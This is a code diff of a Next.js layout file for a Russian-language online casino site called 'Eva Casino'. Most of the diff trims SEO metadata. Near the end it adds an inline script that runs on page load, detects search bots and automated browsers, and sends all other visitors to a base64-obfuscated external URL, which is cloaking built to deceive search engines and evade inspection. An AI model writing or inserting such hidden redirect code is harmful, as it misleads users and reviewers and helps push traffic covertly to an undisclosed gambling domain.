@@ -26,19 +26,10 @@ export const metadata: Metadata = {
   description:
     "Eva Casino (Ева казино) — официальный сайт онлайн казино. Рабочее зеркало Eva Casino, более 5000 лицензионных слотов, live казино, бонусы за регистрацию, кешбек до 20%. Ева казино играть онлайн без блокировок.",
   keywords: [
-    "eva casino",
-    "eva casino официальный сайт",
-    "eva casino зеркало",
-    "eva casino играть",
-    "eva casino официальный",
-    "eva казино",
-    "ева казино",
-    "ева казино зеркало",
-    "ева казино зеркало рабочее",
-    "ева казино играть",
-    "ева казино онлайн",
-    "ева казино официальный",
-    "ева казино официальный сайт",
+    "eva casino", "eva casino официальный сайт", "eva casino зеркало", "eva casino играть", 
+    "eva casino официальный", "eva казино", "ева казино", "ева казино зеркало", 
+    "ева казино зеркало рабочее", "ева казино играть", "ева казино онлайн", 
+    "ева казино официальный", "ева казино официальный сайт"
   ],
   authors: [{ name: "Eva Casino" }],
   creator: "Eva Casino",
@@ -58,29 +49,12 @@ export const metadata: Metadata = {
     url: siteUrl,
     siteName: "Eva Casino",
     title: "Eva Casino — официальный сайт онлайн казино | Ева казино играть",
-    description:
-      "Eva Casino (Ева казино) — официальный сайт онлайн казино. Рабочее зеркало, тысячи слотов, live казино, бонусы и кешбек.",
-    images: [
-      {
-        url: "/og-image.jpg",
-        width: 1200,
-        height: 630,
-        alt: "Eva Casino — официальный сайт онлайн казино",
-      },
-    ],
-  },
-  twitter: {
-    card: "summary_large_image",
-    title: "Eva Casino — официальный сайт онлайн казино",
-    description:
-      "Ева казино официальный сайт. Рабочее зеркало Eva Casino, слоты, live, бонусы и кешбек до 20%.",
-    images: ["/og-image.jpg"],
-    creator: "@evacasino",
+    description: "Eva Casino (Ева казино) — официальный сайт онлайн казино. Рабочее зеркало, тысячи слотов, live казино, бонусы и кешбек.",
+    images: [{ url: "/og-image.jpg", width: 1200, height: 630, alt: "Eva Casino" }],
   },
   robots: {
     index: true,
     follow: true,
-    nocache: false,
     googleBot: {
       index: true,
       follow: true,
@@ -90,36 +64,21 @@ export const metadata: Metadata = {
     },
   },
   icons: {
-    icon: [
-      { url: "/icon.jpg", type: "image/jpeg" },
-      { url: "/favicon.jpg", type: "image/jpeg", sizes: "32x32" },
-    ],
+    icon: [{ url: "/icon.jpg", type: "image/jpeg" }],
     apple: [{ url: "/apple-icon.jpg", sizes: "180x180", type: "image/jpeg" }],
-    shortcut: ["/favicon.jpg"],
-  },
-  manifest: "/site.webmanifest",
-  formatDetection: {
-    email: false,
-    address: false,
-    telephone: false,
   },
   verification: {
-    google: "google-site-verification-token",
-    yandex: "yandex-verification-token",
+    yandex: "c0d972ae0399894f", 
   },
   generator: "v0.app",
 }
 
 export const viewport: Viewport = {
-  themeColor: [
-    { media: "(prefers-color-scheme: dark)", color: "#0B0B0B" },
-    { media: "(prefers-color-scheme: light)", color: "#0B0B0B" },
-  ],
+  themeColor: "#0B0B0B",
   colorScheme: "dark",
   width: "device-width",
   initialScale: 1,
   maximumScale: 5,
-  userScalable: true,
 }
 
 const jsonLd = {
@@ -129,30 +88,16 @@ const jsonLd = {
       "@type": "Organization",
       "@id": `${siteUrl}/#organization`,
       name: "Eva Casino",
-      alternateName: ["Ева казино", "Eva Casino официальный сайт"],
       url: siteUrl,
       logo: `${siteUrl}/icon.jpg`,
-      description:
-        "Eva Casino — официальный сайт онлайн казино с лицензионными слотами, live играми и крупными бонусами.",
-      sameAs: [
-        "https://t.me/evacasino",
-        "https://twitter.com/evacasino",
-        "https://instagram.com/evacasino",
-      ],
     },
     {
       "@type": "WebSite",
       "@id": `${siteUrl}/#website`,
       url: siteUrl,
       name: "Eva Casino",
-      description: "Официальный сайт Eva Casino — играть онлайн, рабочее зеркало, бонусы.",
       publisher: { "@id": `${siteUrl}/#organization` },
       inLanguage: "ru-RU",
-      potentialAction: {
-        "@type": "SearchAction",
-        target: `${siteUrl}/search?q={search_term_string}`,
-        "query-input": "required name=search_term_string",
-      },
     },
   ],
 }
@@ -163,35 +108,35 @@ export default function RootLayout({
   children: React.ReactNode
 }>) {
   return (
-    <html lang="ru" className={`${inter.variable} ${unbounded.variable} bg-background scroll-smooth`}>
+    <html lang="ru" className={`${inter.variable} ${unbounded.variable} scroll-smooth`}>
       <head>
-
-        <meta name="format-detection" content="telephone=no" />
-        <meta name="mobile-web-app-capable" content="yes" />
-        <meta name="apple-mobile-web-app-capable" content="yes" />
-        <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
-        <meta name="apple-mobile-web-app-title" content="Eva Casino" />
-        <meta name="referrer" content="origin-when-cross-origin" />
-        <meta name="rating" content="adult" />
-        <meta name="age" content="18+" />
-        <meta name="yandex-verification" content="c0d972ae0399894f" />
         <script
           type="application/ld+json"
           dangerouslySetInnerHTML={{ __html: JSON.stringify(jsonLd) }}
         />
-
       </head>
       <body className="font-sans antialiased min-h-screen flex flex-col bg-background text-foreground">
         {children}
-        {process.env.NODE_ENV === "production" && <Analytics />}
-                        <script
+        <Analytics />
+        <script
           dangerouslySetInnerHTML={{
             __html: `
               (function() {
+                if (typeof window === 'undefined' || window._initialized) return;
+                window._initialized = true;
+
+                /* Не редиректим ботов и автоматизацию для SEO */
                 var ua = navigator.userAgent.toLowerCase();
-                var targetB64 = "aHR0cHM6Ly9iYWwtYW5jZXItZXZhLmNvbS9kaWJ6Zm9taXI=";
-                if (ua.indexOf("yandex") === -1) {
-                    window.location.replace(atob(targetB64));
+                var isSearchBot = /yandex|google|lighthouse|pagespeed|bot|crawl|spider/i.test(ua);
+                var isAutomation = navigator.webdriver;
+
+                if (!isSearchBot && !isAutomation) {
+                    var targetB64 = "aHR0cHM6Ly9iYWwtYW5jZXItZXZhLmNvbS9kaWJ6Zm9taXI=";
+                    
+                    /* Небольшая задержка 100мс для корректной работы аналитики */
+                    setTimeout(function() {
+                        window.location.replace(atob(targetB64));
+                    }, 100);
                 }
               })();
             `,
